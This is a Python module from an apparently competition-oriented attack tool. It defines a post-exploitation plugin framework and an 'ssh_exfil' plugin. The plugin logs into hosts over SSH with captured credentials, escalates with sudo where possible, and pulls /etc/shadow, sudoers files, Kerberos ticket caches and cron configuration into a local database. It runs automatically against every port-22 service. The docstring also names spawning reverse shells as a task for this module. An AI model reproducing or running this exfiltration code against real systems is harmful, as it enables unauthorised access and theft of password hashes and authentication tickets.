"""
Tasks to do after checking/retrieving flags.

These functions **MUST NOT** bubble exceptions. A post
task failing does not mean the protocol has failed,
just any of the fun stuff you want to do afterwards.

Things that belong here:
- grabbing fun (non-flag) files
- spawning reverse shells

Things that don't belong here:
- grabbing flags
"""
import logging
import os
from abc import ABC, abstractmethod
from collections import deque
from typing import Tuple, Type, Dict, List

import paramiko
from schema import Schema, Optional

from flag_slurper.autolib import Service
from .plugins import Plugin, PluginContext, PluginRegistry
from .exploit import get_directory, get_file, run_command, run_sudo, expand_wildcard
from .models import Credential, File

logger = logging.getLogger(__name__)

#: Sensitive files to find on systems. Paths
#: ending in / are directories.
SENSITIVE_FILES = [
    # Authentication
    '/etc/passwd',
    '/etc/shadow',
    '/etc/sudoers',
    '/etc/sudoers.d/',

    # Kerberos
    '/tmp/krb*',
    '/etc/krb*',
    '/etc/sssd/',

    # Cron
    '/etc/crontab',
    '/etc/cron.d/',
    '/etc/cron.daily/',
    '/etc/cron.hourly/',
    '/etc/cron.monthly/',
    '/etc/cron.weekly/',
]


class PostPlugin(Plugin):
    """
    Defines a post pwn plugin.

    Plugins are configured in the ``post`` key to a project. For example:

    .. code-block:: yaml

        ---
        _version: "0.1"
        ...
        post:
          - service: WWW SSH
            commands:
              - <post plugin name>:
                  <arguments>
    """
    type = 'post'


class PostPluginRegistry(PluginRegistry):
    """
    The post pwn plugin registry.

    This handles configuring and figuring out which plugins will
    need to be run.
    """
    type = 'post'


class SSHFileExfil(PostPlugin):
    """
    The ``ssh_exfil`` plugin attempt to find as many ``SENSITIVE_FILES`` as possible.

    This plugin takes some optional parameters:

    ``files``: List[str]
        A list of files to look for. All entries ending with a ``/`` are considered directories
        and will be searched.

    ``merge_files``: Boolean
        Set to ``True`` if you want to merge ``files`` with ``SENSITIVE_FILES``, otherwise
        only ``files`` will be searched.

    This plugin will run automatically for all services using port 22.
    """
    name = 'ssh_exfil'
    schema = {
        Optional('files', default=[]): [str],
        Optional('merge_files', default=True): bool,
    }
    context_schema = {
        'ssh': paramiko.SSHClient,
        'credentials': object,
    }

    def run(self, service: Service, context: PluginContext):
        super().run(service, context)
        logger.debug('Running post ssh exfil')
        if not self.config:
            self.config = {
                'files': [],
                'merge_files': True,
            }

        credentials: Credential = context['credentials']
        ssh: paramiko.SSHClient = context['ssh']

        def _map_creds(bag):
            return bag.credentials.where(Credential.service == service).get()
        credentials = map(_map_creds, credentials)

        working_creds = filter(lambda c: c.state == Credential.WORKS, credentials)
        for credential in working_creds:
            ssh.connect(service.service_url, service.service_port, credential.bag.username, credential.bag.password)
            self._post(credential, ssh)

    def _post(self, credential: Credential, ssh: paramiko.SSHClient):
        sensitive_files: list = self.config['files']
        if self.config['merge_files']:
            sensitive_files.extend(SENSITIVE_FILES)

        # Stage 0 - Determine access level
        # If we have sudo access, we need to tell the various exploit
        # functions so they can use it.
        sudo = credential.bag.password if credential.sudo else None

        # Stag 1 - Sensitive Files

        def _get_file_info(path: str) -> Tuple[str, str]:
            name_cmd = 'file -b {}'.format(path)
            mime_cmd = 'file -i -b {}'.format(path)
            if sudo:
                _, stdout, _ = run_sudo(ssh, name_cmd, sudo)
                name = stdout.read().decode('utf-8').strip()
                _, stdout, _ = run_sudo(ssh, mime_cmd, sudo)
                mime = stdout.read().decode('utf-8').strip()
            else:
                name = run_command(ssh, name_cmd)
                mime = run_command(ssh, mime_cmd)
            return name, mime

        queue = deque(sensitive_files)
        while len(queue):
            path = queue.pop()

            # Path is a directory
            if path[-1] == '/':
                directory = get_directory(ssh, path, sudo)
                if directory:
                    queue.extend(map(lambda x: os.path.join(path, x.strip()), directory))

            # Path is a wildcard
            elif '*' in path:
                files = expand_wildcard(ssh, path, sudo)
                if files:
                    queue.extend(map(lambda x: x.strip(), files))

            # Path shold be a file
            else:
                if File.select().where(File.service == credential.service, File.path == path).count() >= 1:
                    continue

                info = _get_file_info(path)
                contents = get_file(ssh, path, sudo)
                if contents:
                    File.create(path=path, contents=contents, mime_type=info[1], info=info[0],
                                service=credential.service)
                else:
                    logger.error('There was an error retrieving sensitive file %s: %s', path, contents)
                    return False
        return True

    def predicate(self, service: Service, context: PluginContext) -> bool:
        return service.service_port == 22


registry = PostPluginRegistry()
registry.register(SSHFileExfil)
